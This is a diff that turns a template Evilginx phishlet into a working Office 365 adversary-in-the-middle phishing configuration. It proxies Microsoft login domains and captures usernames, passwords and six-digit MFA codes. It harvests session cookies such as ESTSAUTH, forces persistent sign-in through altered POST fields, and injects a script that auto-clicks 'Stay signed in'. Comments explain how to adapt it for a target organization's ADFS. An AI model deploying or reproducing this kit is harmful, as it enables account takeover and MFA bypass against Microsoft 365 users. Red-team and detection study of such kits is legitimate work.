@@ -1,20 +1,85 @@
+name: 'o365'
+author: '@jamescullum (updated by R3alM0m1X82 and IA for 2025)'
 min_ver: '3.0.0'
 proxy_hosts:
-  - {phish_sub: 'academy', orig_sub: 'academy', domain: 'breakdev.org', session: true, is_landing: true, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: false, is_landing: false}
+  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office365.com', session: false, is_landing: false}
+  - {phish_sub: 'outlook', orig_sub: 'outlook', domain: 'office.com', session: false, is_landing: false}
+  # The lines below are needed if your target organization utilizes ADFS.
+  # If they do, you need to uncomment all following lines that contain <...>
+  # To get the correct ADFS subdomain, test the web login manually and check where you are redirected.
+  # Assuming you get redirected to adfs.example.com, the placeholders need to be filled out as followed:
+  #    <insert-adfs-subdomain> = adfs
+  #    <insert-adfs-host> = example.com
+  #    <insert-adfs-subdomain-and-host> = adfs.example.com
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>', session: true, is_landing:false}
+  #- {phish_sub: 'adfs', orig_sub: '<insert-adfs-subdomain>', domain: '<insert-adfs-host>:443', session: true, is_landing:false}
 sub_filters:
-  - {triggers_on: 'breakdev.org', orig_sub: 'academy', domain: 'breakdev.org', search: 'something_to_look_for', replace: 'replace_it_with_this', mimes: ['text/html']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript'], redirect_only: true}
+  - {triggers_on: 'm365.cloud.microsoft', orig_sub: 'm365', domain: 'cloud.microsoft', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # Fix for new Microsoft endpoints
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'm365\.cloud\.microsoft', replace: 'm365.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  # Uncomment and fill in if your target organization utilizes ADFS
+  #- {triggers_on: '<insert-adfs-subdomain-and-host>', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+auth_urls:
+  - '/kmsi*'
+  - '/landingv2*'
+  - '/oauth2/*'
+  - '/common/oauth2/*'
 auth_tokens:
-  - domain: '.academy.breakdev.org'
-    keys: ['cookie_name']
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'CCState', 'buid', 'esctx', 'fpc']
+  - domain: '.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie', 'CCState', 'x-ms-gateway-slice', 'stsservicecookie']
+  - domain: '.microsoft.com'
+    keys: ['OIDCAuth', 'MUID']
+  - domain: '.office.com'
+    keys: ['ROBX', 'OIDC']
+  - domain: '.cloud.microsoft'
+    keys: ['OIDCAuth', 'OptInPBT']
+force_post:
+  - path: '/*'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '3'}
+    type: 'post'
+  - path: '/kmsi*'
+    search:
+      - {key: 'LoginOptions', search: '.*'}
+      - {key: 'DontShowAgain', search: '.*'}
+    force:
+      - {key: 'LoginOptions', value: '1'}
+      - {key: 'DontShowAgain', value: 'true'}
+    type: 'post'
 credentials:
   username:
-    key: 'email'
+    key: '(login|loginfmt|UserName|Email)'
     search: '(.*)'
     type: 'post'
   password:
-    key: 'password'
+    key: '(passwd|Password|Passwd)'
     search: '(.*)'
     type: 'post'
+  custom:
+    - key: 'otc'
+      search: '([0-9]{6})'
+      type: 'post'
 login:
-  domain: 'academy.breakdev.org'
-  path: '/evilginx-mastery'
+  domain: 'login.microsoftonline.com'
+  path: '/'
+js_inject:
+  - trigger_domains: ['login.microsoftonline.com']
+    trigger_paths: ['/*']
+    trigger_params: []
+    script: |
+      // Auto-click "Stay signed in" button
+      setTimeout(function() {
+        var staySignedIn = document.querySelector('#idSIButton9');
+        if (staySignedIn && staySignedIn.value === "Yes") {
+          staySignedIn.click();
+        }
+      }, 2000);
